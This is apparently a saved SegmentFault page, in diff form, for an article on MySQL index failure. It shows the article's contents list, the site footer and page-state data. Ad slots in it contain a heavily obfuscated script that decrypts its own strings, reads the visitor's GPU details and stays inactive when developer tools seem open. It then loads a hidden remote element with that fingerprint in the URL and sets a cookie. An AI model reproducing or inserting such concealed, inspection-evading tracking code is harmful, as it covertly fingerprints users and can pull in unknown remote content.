_0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div><div class="mb-3"><div id="OA_holder_9" class="ad-container" style="display:block"><div id="beacon_126fa296e8" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg(6).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
+</div></div><div><div id="OA_holder_10" class="ad-container" style="display:block"><div id="beacon_4088d3e6d9" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg(7).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
+</div></div></div></div></div><div id="second-ad" class="d-none d-xl-block" style="top: auto; margin-top: 0px;"><div id="OA_holder_31" class="ad-container" style="display:block"><div class="rounded overflow-hidden"><a href="https://sponsor.segmentfault.com/ck.php?oaparams=2__bannerid=334__zoneid=31__cb=9eab5d6bb4__oadest=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000020336555" target="_blank"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/bb270f7c8f4604f08f8530813cc9e40c.png" width="300" height="100" alt="程序员求职攻略" title="程序员求职攻略" border="0"></a><div id="beacon_9eab5d6bb4" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg(8).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div><div id="cataLog" class="d-none d-xl-block w-xl-300 mt-4" style="top: auto;"><div data-article-nav="true" class="accordion"><div class="overflow-hidden d-none d-xl-flex card"><div class="card-body"><div><h6 class="nav-header h6 p-0 m-0"><i class="fas fa-play fa-rotate-undefined"></i><span> 目录</span></h6></div><div id="collapseTarget" class="collapse"><nav id="article-nav-list" class="d-flex flex-column font-size-14 ss-container" data-article-nav-list="true"><div class="ss-wrapper"><div class="ss-content"><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-1" href="javascript:;">图片总结版</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-2" href="javascript:;">全值匹配（索引最佳）</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-3" href="javascript:;">1、违反最左前缀法则</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-4" href="javascript:;">2、在索引列上做任何操作</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-5" href="javascript:;">3、索引范围条件右边的列</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-6" href="javascript:;">4、尽量使用覆盖索引</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-7" href="javascript:;">5、使用不等于（!=、&lt;&gt;）</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-8" href="javascript:;">6、like以通配符开头（'%abc'）</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-9" href="javascript:;">7、字符串不加单引号索引失效</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-10" href="javascript:;">8、or连接</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-11" href="javascript:;">9、order by</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-12" href="javascript:;">10、group by</a><a class="nav-link text-secondary p-0 my-1 text-truncate" scroll-href="#item-13" href="javascript:;">使用的示例数据</a></div></div><div class="ss-scroll" style="right: 0px;"></div></nav></div></div></div></div></div></div></div></div><div id="fixedTools" class="position-fixed d-none " style="right:24px;bottom:24px"><button type="button" class="btn btn-light" title="回顶部">▲</button></div></div><footer id="footer" class="d-none d-sm-block bg-white py-5 font-size-14"><div class="container"><div class="row"><dl class="col-4 col-md-2"><dt class="h6">产品</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/questions/hottest?utm_source=sf-footer" target="_blank" rel="noreferrer">热门问答</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blogs/hottest?utm_source=sf-footer" target="_blank" rel="noreferrer">热门专栏</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives?utm_source=sf-footer" target="_blank" rel="noreferrer">热门课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/events?utm_source=sf-footer" target="_blank" rel="noreferrer">最新活动</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/groups?utm_source=sf-footer" target="_blank" rel="noreferrer">技术圈</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/groups?tab=jobs&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">酷工作</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/app?utm_source=sf-footer" target="_blank" rel="noreferrer">移动客户端</a></dd></dl><dl class="col-4 col-md-2"><dt class="h6">课程</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/edu?tag=java&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">Java 开发课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/edu?tag=php&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">PHP 开发课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/edu?tag=python&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">Python 开发课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/edu?category=1&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">前端开发课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/study?category=3&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">移动开发课程</a></dd></dl><dl class="col-4 col-md-2 "><dt class="h6">资源</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/weekly?utm_source=sf-footer" target="_blank" rel="noreferrer">每周精选</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/users?utm_source=sf-footer" target="_blank" rel="noreferrer">用户排行榜</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/badges?utm_source=sf-footer" target="_blank" rel="noreferrer">徽章</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/faq?utm_source=sf-footer" target="_blank" rel="noreferrer">帮助中心</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/repu?utm_source=sf-footer" target="_blank" rel="noreferrer">声望与权限</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/community?utm_source=sf-footer" target="_blank" rel="noreferrer">社区服务中心</a></dd></dl><dl class="col-4 col-md-2"><dt class="h6">合作</dt><dd class="my-1"><a class="text-secondary" href="https://about.segmentfault.com/?utm_source=sf-footer" target="_blank" rel="noreferrer">关于我们</a></dd><dd class="my-1"><a class="text-secondary" href="https://business.segmentfault.com/ads?utm_source=sf-footer" target="_blank" rel="noreferrer">广告投放</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/groups?tab=jobs&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">职位发布</a></dd><dd class="my-1"><a class="text-secondary" href="https://jinshuju.net/f/HK5r9K?utm_source=sf-footer" target="_blank" rel="noreferrer">讲师招募</a></dd><dd class="my-1"><a class="text-secondary" href="https://about.segmentfault.com/contact.html?utm_source=sf-footer" target="_blank" rel="noreferrer">联系我们</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/link?utm_source=sf-footer" target="_blank" rel="noreferrer">合作伙伴</a></dd></dl><dl class="col-4 col-md-2"><dt class="h6">关注</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/segmentfault?utm_source=sf-footer" target="_blank" rel="noreferrer">产品技术日志</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/community_admin?utm_source=sf-footer" target="_blank" rel="noreferrer">社区运营日志</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/segmentfault_news?utm_source=sf-footer" target="_blank" rel="noreferrer">市场运营日志</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/segmentfault_team?utm_source=sf-footer" target="_blank" rel="noreferrer">团队日志</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/interview?utm_source=sf-footer" target="_blank" rel="noreferrer">社区访谈</a></dd></dl><dl class="col-4 col-md-2" id="license"><dt class="h6">条款</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/tos?utm_source=sf-footer" target="_blank" rel="noreferrer">服务条款</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/privacy?utm_source=sf-footer" target="_blank" rel="noreferrer">隐私政策</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/app?utm_source=sf-footer">下载 App</a></dd><dd class="my-1"><div class="weixin-qrcode ml-n1" title="微信公众号"></div></dd></dl></div><hr class="mt-2 mb-4"><div class="row"><div class="col-md-8"><div class="text-secondary"><p class="mb-1">Copyright © 2011-<!-- -->2021<!-- --> SegmentFault. 当前呈现版本 <!-- -->21.04.23</p><p class="mb-1"><a class="text-secondary mr-2" target="_blank" href="http://beian.miit.gov.cn/" rel="nofollow noreferrer">浙ICP备15005796号-2</a><a class="text-secondary mr-2" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602002000" rel="nofollow noreferrer">浙公网安备33010602002000号</a><span class="text-secondary">ICP 经营许可 浙B2-20201554</span></p><p class="mb-0">杭州堆栈科技有限公司版权所有</p></div></div><div class="col-md-4 text-right"><div class="shareContent"><a class="share_weixin" data-share="weixin" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#javascript" aria-label="微信"><i class="mr-1 fab fa-weixin"></i></a><a class="share_weibo" data-share="weibo" href="http://weibo.com/segmentfault" target="_blank" rel="noreferrer" aria-label="微博"><i class="fab fa-weibo mr-1"></i></a><a class="share_github" data-share="github" href="https://github.com/SegmentFault" target="_blank" rel="noreferrer" aria-label="github"><i class="mr-1 fab fa-github"></i></a><a class="share_twitter" data-share="twitter" href="https://twitter.com/segment_fault" target="_blank" rel="noreferrer" aria-label="twitter"><i class="mr-1 fab fa-twitter"></i></a></div></div></div></div></footer></div>
+	<script>
+  window.g_useSSR = true;
+  window.g_initialProps = {"router":{"location":{"pathname":"\u002Fa\u002F1190000021464570","search":"?utm_source=sf-similar-article","hash":"","query":{"utm_source":"sf-similar-article"},"state":undefined,"key":"54egca"},"action":"POP"},"@@dva":0,"action":{"votes":34,"bookmarks":29,"votesState":false,"bookmarkState":false},"article":{"articles":{"rows":[],"size":0,"offset":0,"hasMore":true,"error":false,"loading":false,"isStopLoad":false,"cutLoadNum":1,"isLoadedFirstRecommend":false,"query":""},"currentTab":""},"articleDetail":{"artDetail":{"1190000021464570":{"title":"mysql - 一张图搞懂MySQL的索引失效_个人文章","keywords":"mysql","description":"索引对于MySQL而言，是非常重要的篇章。索引知识点也巨多，要想掌握透彻，需要逐个知识点一一击破，今天来先来聊聊哪些情况下会导致索引失效。 图片总结版 全值匹配（索引最佳） {代码...} {代码...} 1、违反最左前缀法则 {代码...} 2、在索引列上做任何操作 {代码...} 3、索引范围条件右边的列 {代码...} 4、尽量使用覆...","article":{"id":1190000021464570,"title":"一张图搞懂MySQL的索引失效","cover":null,"tags_list":"1040000000089439","user_id":1030000021451572,"blog_id":0,"excerpt":"索引对于MySQL而言，是非常重要的篇章。索引知识点也巨多，要想掌握透彻，需要逐个知识点一一击破，今天来先来聊聊哪些情况下会导致索引失效。 图片总结版 全值匹配（索引最佳） {代码...} {代码...} 1、违反最左前缀法则 {代码...} 2、在索引列上做任何操作 {代码...} 3、索引范围条件右边的列 {代码...} 4、尽量使用覆...","parsed_text":"","is_bookmarked":false,"is_liked":false,"created":1577942491,"modified":1578032639,"real_views":6299,"real_unique_views":4766,"votes":34,"bookmarks":29,"status":0,"origin_url":"","article_type":1,"license":"1","langs":[],"tags":[{"id":1040000000089439,"url":"\u002Ft\u002Fmysql","name":"mysql","icon_url":"https:\u002F\u002Favatar-static.segmentfault.com\u002F949\u002F844\u002F9498447-54cb56e325a72_small"}],"user":{"id":1030000021451572,"name":"张德Talk","avatar_url":"https:\u002F\u002Favatar-static.segmentfault.com\u002F930\u002F593\u002F93059368-5e0ade65df70d_huge128","url":"\u002Fu\u002Fzhangdejian","rank":512,"rankWord":"512","is_followed":false,"excerpt":"\u003Cp\u003E每日精进，致力于成为全栈工程师！\u003C\u002Fp\u003E","followers":623,"articles":24,"user_auth":null},"status_key":"available"},"blog":null,"actions":[],"member_actions":[],"article_types":{"1":"原创","2":"转载","3":"翻译"},"extra":{"reason":null,"operator":null,"operator_time":null},"tag":{"name":"mysql","url":"\u002Ft\u002Fmysql","icon_url":"https:\u002F\u002Favatar-static.segmentfault.com\u002F949\u002F844\u002F9498447-54cb56e325a72_small"},"isServerLoaded":true}},"alertMsg":{"showAlert":false,"msg":""},"articleRelated":[]},"editor":{"markdownContent":"","syncMarkdown":false,"title":{"value":"","isInvalid":false,"errorMsg":""},"log":{"value":"","isInvalid":false,"errorMsg":""},"draftInfo":{"id":"","status":""},"isInsert":false,"isFull":false},"global":{"sessionUser":null,"isHiddenHeader":false,"isHiddenFooter":false,"title":"一张图搞懂MySQL的索引失效 - SegmentFault 思否","selectedTags":[],"isShowLogin":false,"beginnerGuideState":{"visible":false,"type":1},"isShowBindMobile":false,"authChannel":"","unactivated":false,"isShowRegister":false,"headOptions":{"keywords":"mysql","description":"索引对于MySQL而言，是非常重要的篇章。索引知识点也巨多，要想掌握透彻，需要逐个知识点一一击破，今天来先来聊聊哪些情况下会导致索引失效。 图片总结版 全值匹配（索引最佳） {代码...} {代码...} 1、违反最左前缀法则 {代码...} 2、在索引列上做任何操作 {代码...} 3、索引范围条件右边的列 {代码...} 4、尽量使用覆..."},"notices":[],"sessionInfo":{"key":"be2f1fcca041e57407764b41d031c3e8","login":false,"id":null},"singleNotice":"","currentRoute":{"customLayout":false},"letterNum":0,"noticeNum":0,"serverData":{"userAgent":"Mozilla\u002F5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\u002F537.36 (KHTML, like Gecko) Chrome\u002F90.0.4430.85 Safari\u002F537.36 Edg\u002F90.0.818.46","Token":"be2f1fcca041e57407764b41d031c3e8"},"userStat":{},"newTask":{},"followedTags":[],"globalCss":"","baiduOxAppState":{"isShow":false,"copyUrl":""}},"video":{"videoData":{},"relationVideos":[],"videos":{"rows":[],"limit":0,"offset":0,"hasMore":true},"lives":[]},"blogs":{"channels":{},"articles":{"mode":"scrollLoad","page":1,"rows":[],"size":0,"offset":0,"hasMore":true,"error":false,"loading":false,"isStopLoad":false,"cutLoadNum":1,"isLoadedFirstRecommend":false},"currentTab":"recommendation","notices":{},"events":{},"recommendArticles":{},"hotQuestions":{},"hotTestData":{},"banners":{}},"letterDetail":{"letterData":{"rows":[],"page":1,"size":100,"total_page":0,"hasMore":true},"loading":false,"readAll":false},"inbox":{"list":{"page":1,"count":0,"rows":{"inbox":{},"messages":[]},"total_page":1},"loading":false},"noticeDetail":{"noticeData":{"rows":[],"offset":"","hasMore":true,"isStopScrollLoad":false,"loadedNum":1},"loading":false,"readAll":false},"personal":{"personalInfo":{},"listInfo":{"rows":[]},"blogs":[],"tags":{},"badges":{},"ranks":{},"loading":false},"personalSetting":{"userInfo":{},"errorMsg":{"type":"","msg":""}},"portal":{"pageData":{},"noticeData":[]},"question":{"questionDetail":{},"relateDetail":{}},"questionList":{"questionList":{"page":1,"size":30,"count":0,"total_page":0,"rows":[]},"updateList":{"offset":"","rows":[]},"showLoading":false,"hostData":{},"userRank":{},"notices":{},"loading":false},"sites":{"questionList":{"page":1,"size